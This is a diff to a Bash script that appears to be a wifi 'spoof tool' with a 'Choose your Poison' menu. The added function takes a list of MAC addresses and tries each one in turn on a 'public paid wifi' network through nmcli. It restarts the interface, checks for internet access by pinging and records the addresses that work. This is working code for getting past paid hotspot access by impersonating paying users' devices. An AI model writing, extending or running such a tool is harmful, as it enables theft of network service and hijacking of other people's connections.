@@ -107,6 +107,31 @@ select_point(){
 		echo -e "[◉] ${Yellow} target alien not found consider scanning ${reset}"
 	fi
 }
+select_custom(){
+	echo -e "${Yellow} Enter custom path to mac address list Format(xx:xx:xx:xx:xx)-list Format /path/to/list -path....${reset}"
+	read path
+	while IFS= read -r user
+	do
+		get_interface
+		nmcli connection modify "${wifiname_1}" $card_config "$user" &>/dev/null
+		drowsy_1 "$timeduck"
+		disable_wifi_iface
+		enable_wifi_iface
+		drowsy_1 "$timeduck"
+		nmcli d wifi connect "${wifiname_1}" &>/dev/null
+		drowsy_1 "$timeleap"
+		Routing_to=$(ip route show default | awk '/default/ {print $3}')
+		echo -e "${purple} [~]${reset} Checking interent connectivity on ${Yellow} $user ${reset} ... Route:_ ${purple} $Routing_to ${reset}"
+		net=www.google.com
+		result=$(ping -c 3 "$net" > /dev/null && echo "Connected" || echo "Not Connected")
+		if [ "$result" = "Connected" ]; then
+			echo -e "${Yellow} [✔] ${reset} ${purple} Internet available ${reset}"
+			echo "$user" >> $config_path/$online
+		else
+			echo -e "${purple}[${reset}${red}＊${reset}${purple}]${reset} ${red} No internet conections ${reset}"
+		fi
+	done < "$path"
+}
 
 wifi_spoof_tool(){
 	echo -e "${Yellow} Enter the public paid wifi name....${reset}"
@@ -169,6 +194,7 @@ Choose your Poison:
     1. Scan for live internet user
     2. Select live user from file
     3. Remove all alien life
+	4. Custom file list
     0. Quit
 EOF
 echo -n 'Enter selection [0-quit]: '
@@ -180,6 +206,7 @@ case $poison in
 	2) select_point ;;
 	3)
 		rm -rf /tmp/freep ;;
+	4) select_custom ;;
 	*)
 		echo "Invalid entry." >&2
 		exit 1
